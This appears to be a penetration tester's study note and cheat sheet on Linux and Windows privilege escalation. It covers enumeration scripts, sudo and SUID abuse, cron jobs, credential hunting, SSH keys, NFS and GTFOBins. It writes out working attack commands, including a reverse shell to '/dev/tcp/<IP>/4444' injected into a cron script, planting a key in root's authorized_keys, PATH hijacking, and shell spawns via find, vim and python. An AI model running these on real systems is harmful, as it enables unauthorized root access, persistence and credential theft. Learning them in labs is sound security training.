
## ⚡ Goal

- Thoroughly **enumerate the system** to find potential weaknesses.
- Use **checklists/cheat sheets**:
    - [HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- Commands can be automated via **enumeration scripts**:
    - Linux: `LinEnum`, `linuxprivchecker`
    - Windows: `Seatbelt`, `JAWS`
    - PEASS (Privilege Escalation Awesome Scripts SUITE) for both OSes
- ⚠️ Scripts generate **noise** → may trigger AV/IDS, consider manual enumeration.

---

### 2. Kernel Exploits

- Check for **old/unpatched OS versions**.
- Linux example: kernel `3.9.0-73-generic` → DirtyCow (`CVE-2016-5195`).
- Windows: many vulnerabilities exist for unpatched versions.
- ⚠️ Kernel exploits can cause **system instability** → test in lab first.

---

### 3. Vulnerable Software

- Enumerate installed software:
    - Linux: `dpkg -l`
    - Windows: `C:\Program Files`
- Look for **public exploits** for older versions.

---

### 4. User Privileges

- Check current **user privileges**.
- Methods to escalate:
    - **Sudo (Linux)**
        - `sudo -l` → list allowed commands
        - `sudo su -` → switch to root if permitted
        - NOPASSWD entries allow command execution **without password**
        - Use [GTFOBins](https://gtfobins.github.io/) to exploit sudoable binaries
    - **SUID binaries (Linux)** → files with elevated privileges
    - **Windows Token Privileges** → run commands as higher-privileged users
- Scheduled tasks / Cron Jobs:
    - Exploit to execute **malicious scripts**
    - Directories: `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/crontabs/root`

---

### 5. Exposed Credentials

- Check **config files, logs, user history** for passwords:
    - Linux: `bash_history`, `/var/www/html/config.php`
    - Windows: `PSReadLine`, logs
- Use found passwords to:
    - `su` to root/system
    - SSH into the server as that user

---

### 6. SSH Keys

- If you can read a user's `.ssh` directory:
    - Copy `id_rsa` → log in with `ssh -i id_rsa user@host`
    - Must set proper permissions: `chmod 600 id_rsa`
- If you have **write access** to `.ssh`:
    - Add your **public key** to `authorized_keys`:
        
        echo "your-public-key" >> /home/user/.ssh/authorized_keys
        
    - Only works if you already control that user
- Generate new key:
    
    ssh-keygen -f key
    
    - Use `key` as private key: `ssh -i key user@host`

---

## ⚡ Key Takeaways

- PrivEsc requires **enumeration + targeted exploits**.
- Focus areas:
    1. Kernel & OS vulnerabilities
    2. Software vulnerabilities
    3. User privileges (Sudo, SUID, Windows Tokens)
    4. Scheduled tasks / cron jobs
    5. Exposed credentials
    6. SSH key exploitation
- Use tools **carefully**, manual checks may avoid detection.
- Always check for **permissions and NOPASSWD entries** for easier escalation.

#links of interest
linux peas
https://gtfobins.github.io/

scripts
https://github.com/rebootuser/LinEnum.git
https://github.com/sleventyeleven/linuxprivchecker
windows peas
https://lolbas-project.github.io/#
scripts
https://github.com/411Hall/JAWS
https://github.com/GhostPack/Seatbelt
server enum
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite



<script>
|   |   |
|---|---|
|`./linpeas.sh`|Run `linpeas` script to enumerate remote server|

|`sudo -l`|List available `sudo` privileges|

|`sudo -u user /bin/echo Hello World!`|Run a command with `sudo`|

|`sudo su -`|Switch to root user (if we have access to `sudo su`)|

|`sudo su user -`|Switch to a user (if we have access to `sudo su`)|

|`ssh-keygen -f key`|Create a new SSH key|

|`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`|Add the generated public key to the user|

|`ssh root@10.10.10.10 -i key`|SSH to the server with the generated private key|





#WorkFlow #linpeas


# PrivEsc Commands Cheat Sheet (Explained)

---

# 🔐 SUDO

sudo -l

➡️ Lists commands you can run as another user (usually root)

sudo su -

➡️ Switch to root shell (if allowed)

sudo -u <user> <command>

➡️ Run command as another user

---

# 🔑 SUID

find / -perm -4000 -type f 2>/dev/null

➡️ Finds files that run with **owner privileges (often root)**

./binary -p

➡️ Attempts to preserve privileges when executing SUID binary

---

# 🧪 CAPABILITIES

getcap -r / 2>/dev/null

➡️ Lists binaries with special privileges (capabilities)

---

# ⏰ CRON JOBS

crontab -l

➡️ Shows current user scheduled tasks

cat /etc/crontab

➡️ Shows system-wide cron jobs

ls -al /etc/cron*

➡️ Lists cron directories and files

systemctl list-timers --all

➡️ Shows scheduled systemd timers

---

# 🎯 FIND WRITABLE CRON FILES

find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null

➡️ Finds cron files you can modify

grep -r 'bin/' /etc/cron*

➡️ Finds scripts executed by cron

---

# 📡 REVERSE SHELL INJECTION (CRON)

echo "bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /path/to/script

➡️ Injects reverse shell into script executed by cron

---

# 🛣️ PATH HIJACKING

echo $PATH

➡️ Shows command search paths

echo $PATH | tr ':' '\n'

➡️ Lists PATH directories line by line

find $(echo $PATH | tr ':' ' ') -writable 2>/dev/null

➡️ Finds writable directories in PATH

---

export PATH=/tmp:$PATH

➡️ Adds `/tmp` to beginning of PATH (for hijacking)

---

echo -e '#!/bin/bash\n/bin/bash' > /tmp/fakecmd  
chmod +x /tmp/fakecmd

➡️ Creates malicious fake command

---

# 🔍 ENUMERATION (SOFTWARE / SYSTEM)

dpkg -l

➡️ Lists installed packages (Linux)

ls /usr/bin /usr/sbin

➡️ Lists available binaries

---

# 🔐 CREDENTIAL HUNTING

cat ~/.bash_history

➡️ Checks command history for passwords

grep -r "password" / 2>/dev/null

➡️ Searches for passwords in files

---

# 🔑 SSH KEYS

ls -la ~/.ssh/

➡️ Lists SSH keys

cat ~/.ssh/id_rsa

➡️ Reads private key

---

chmod 600 id_rsa

➡️ Fixes permissions so SSH will accept key

ssh -i id_rsa user@target

➡️ Login using private key

---

ssh-keygen -f key

➡️ Generates SSH key pair

---

echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys

➡️ Adds your key for persistent SSH access

---

# 🌐 NFS EXPLOITATION

showmount -e <target_ip>

➡️ Lists available NFS shares

mount -t nfs -o rw <target_ip>:/share /mnt

➡️ Mounts NFS share locally

---

gcc exploit.c -o exploit

➡️ Compiles exploit

chmod +s exploit

➡️ Sets SUID bit (runs as root)

---

./exploit

➡️ Executes exploit → root shell

---

# 🧠 GTFOBINS CORE

sudo find . -exec /bin/sh \; -quit

➡️ Spawns root shell via find

sudo vim -c ':!/bin/sh'

➡️ Spawns shell via vim

python3 -c 'import os; os.system("/bin/sh")'

➡️ Spawns shell via python

---

# 🧠 FINAL FLOW (COMMAND THINKING)

sudo -l  
find / -perm -4000 2>/dev/null  
getcap -r / 2>/dev/null

➡️ Identify privilege escalation vectors












</script>